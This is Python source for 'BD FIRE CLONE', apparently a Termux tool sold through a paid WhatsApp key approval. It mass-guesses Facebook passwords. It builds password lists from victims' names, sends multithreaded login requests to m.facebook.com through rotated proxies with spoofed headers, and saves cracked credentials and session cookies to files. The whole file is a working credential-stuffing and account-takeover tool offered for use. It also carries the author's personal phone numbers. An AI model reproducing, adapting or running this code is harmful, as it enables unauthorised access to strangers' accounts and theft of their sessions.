def main_apv():

    imt="110Y=="

    ak="TUNAN_100RS"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("༄•───────────────────────────────────────•༄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄•───────────────────────────────────────•༄")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print ("༄•───────────────────────────────────────•༄")
        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("༄•───────────────────────────────────────•༄")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/01887074682?text=' + tks)

        

    r1=requests.get("https://github.com/ITS-TUNAN/Lavel69/blob/main/Tunantest.txt").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \33[1;94mGIVE ME 100RS FOR APROVAL RIFAT")     
           
        print ("             \33[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄•───────────────────────────────────────•༄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/+8801735787710?text=' + tks)
        #------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""
                                    

 ________  ___  _____   _  __
/_  __/ / / / |/ / _ | / |/ /
 / / / /_/ /    / __ |/    / 
/_/  \____/_/|_/_/ |_/_/|_/  
                                                         
 \033[1;32mâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
\033[1;32m â”‚\33[37;41m\t     BD FIRE    CLONE VERSION 2.0      \33[0;m  â”‚
 \033[1;32mâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
 \033[1;32mâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 \033[1;32mâ”‚\033[1;31mâž£\033[1;91m DEVELOPMENT     \033[1;31m:\033[1;32m SHEIKH TUNAN UDDIN
 \033[1;32mâ”‚\033[1;31mâž£\033[1;32m FACEBOOK        \033[1;31m:\033[1;32m Sk. Safiuddin
 \033[1;32mâ”‚\033[1;31mâž£\033[1;91m WHATSAPP        \033[1;31m:\033[1;32m 01887074682
 \033[1;32mâ”‚\033[1;31mâž£\033[1;32m GITHUB          \033[1;31m:\033[1;32m ITS-TUNAN
 \033[1;32mâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  """)
os.system('clear')
banner()
#os.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_NOOB_WORLD.mp3")
print(f' {dt}\033[1;32mWHAT IS YOUR NAME\033[1;37m')
AKASH_NAME=input(f' {dt}YOUR NAME \033[1;37m ')
#--------------------[ BAGIAN-MASUK ]--------------#


#------------------[ BAGIAN-MENU ]----------------#
def menu():
	
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	_AKASH_(f'\x1b[1;91mâ”â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”“')
	_AKASH_(f'\x1b[1;91mâ”‚\033[47m\033[1;30m USER INFORMATION\033[40m\033[00m\x1b[1;91m       â”‚')
	_AKASH_(f'\x1b[1;91mâ” â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¯â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”›')
	_AKASH_(f'\x1b[1;91mâ”‚\x1b[1;92mYOUR NAME\x1b[1;91mâ”€â”€â”€â”€â•‚âž£\x1b[1;92m '+str(AKASH_NAME))
	_AKASH_(f'\x1b[1;91mâ”‚\x1b[1;92mYOUR ID NAME\x1b[1;91mâ”€â•‚âž£\x1b[1;92m ')
	_AKASH_(f'\x1b[1;91mâ”‚\x1b[1;92mCLONING DATE\x1b[1;91mâ”€â•‚âž£ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}')
	_AKASH_(f"\x1b[1;91mâ”‚\x1b[1;92mCLONING TIME\x1b[1;91mâ”€â•‚âž£ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	_AKASH_(f'\x1b[1;91mâ”‚\x1b[1;92mYOUR ID\x1b[1;91mâ”€â”€â”€â”€â”€â”€â•‚âž£\x1b[1;92m ')
	_AKASH_(f'\x1b[1;91mâ”‚\x1b[1;92mYOUR IP\x1b[1;91mâ”€â”€â”€â”€â”€â”€â•‚âž£ \x1b[1;92m{ip}')
	_AKASH_(f'\x1b[1;91mâ”—â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”›')
	_AKASH_(f'{dt}{I} \033[47m\033[1;34m  MAIN MENU  \033[40m\033[00m')
	_AKASH_(f'\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m FILE CRACK')
	_AKASH_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m CONTACT ME')
	_AKASH_(f'\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;91m EXIT')
	_____AKASH_____ = input(f'{dt}{I}Choose {Q}')
	if _____AKASH_____ in ['1']:
		#os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		F()
	if _____AKASH_____ in ['2']:
		#os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/profile.php?id=100053264861913")
	if _____AKASH_____ in ['0']:
		os.system('exit')
		exit()
	else:
		print(' {dt}Successful Bra ðŸ˜„ ')
		back()
def error():
	print(f' {dt}\033[1;92mSORRY, PLZ CHOOSE THE RIGHT MENU')
	time.sleep(2)
	back()
	

#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			print(f' {dt}{I}   Example: /sdcard/AKASH.txt     {Q}')
			fileX = input (f' {dt}{I}   ENTER YOUR FILE > {Q}') 
			os.system('clear')
			banner()
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' {dt}{I}TOTAL ID >> \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print(f" {dt}{I}FILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	
	hu = '1'
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f' {dt}{I} WRONG CHOICE...!')
		exit()
	
	
	hc = "1"
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
  
	print(f' {dt}----------------------------------------------')
	print(f"\x1b[1;91m {dt} \x1b[1;92mYOUR NAME         \x1b[1;92m"+str(AKASH_NAME))
	print(f"\x1b[1;91m {dt} \x1b[1;92mTOTAL ID          "+str(len(id)))
	print(f"\x1b[1;91m {dt} \x1b[1;92mTODAY TIME        \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print(f"\x1b[1;91m {dt} \x1b[1;92mTODAY DATE        \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	print(f" {dt} {I}NOTE \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
	print(f' {dt}----------------------------------------------')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' {dt}{I} CRACK COMPLETE ')
	print(f' {dt} {I} TOTAL OK : {h}%s '%(ok))
	print(f'{dt}{I}Main Manu \x1b[1;92m[Y]\n \x1b[1;91m\x1b[1;91mExit [T]')
	woi = input(f' {dt}{I}Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'{dt}{I}Allah Hafiz Bro {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [NOOB] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(noob)
	ua2 = random.choice(noob2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=618974734879191&kid_directed_site=0&app_id=618974734879191&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D618974734879191%26cbt%3D1676043435223%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df30117243c7bec%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%26client_id%3D618974734879191%26display%3Dtouch%26domain%3Dteenpattigold.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fteenpattigold.com%252F%26locale%3Den_US%26logger_id%3Df2f27a16e08cb04%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3bf89c24c3948%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%2526frame%253Df23e7c188c6c05%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3bf89c24c3948%26domain%3Dteenpattigold.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fteenpattigold.com%252Ff279db02fef3abc%26relation%3Dopener%26frame%3Df23e7c188c6c05%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=618974734879191&auth_token=00e3002825e34140ef1c826deabf0dbd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D618974734879191%26cbt%3D1676043435223%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df30117243c7bec%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%26client_id%3D618974734879191%26display%3Dtouch%26domain%3Dteenpattigold.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fteenpattigold.com%252F%26locale%3Den_US%26logger_id%3Df2f27a16e08cb04%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3bf89c24c3948%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%2526frame%253Df23e7c188c6c05%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=618974734879191&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3bf89c24c3948%26domain%3Dteenpattigold.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fteenpattigold.com%252Ff279db02fef3abc%26relation%3Dopener%26frame%3Df23e7c188c6c05%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=en_GB&refid=9',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;93m[NOOB-CP] {idf} | {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n [TUNAN-OK] [ðŸ’š] {idf} | {pw}\n {dt}{I}COOKIES {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    menu()

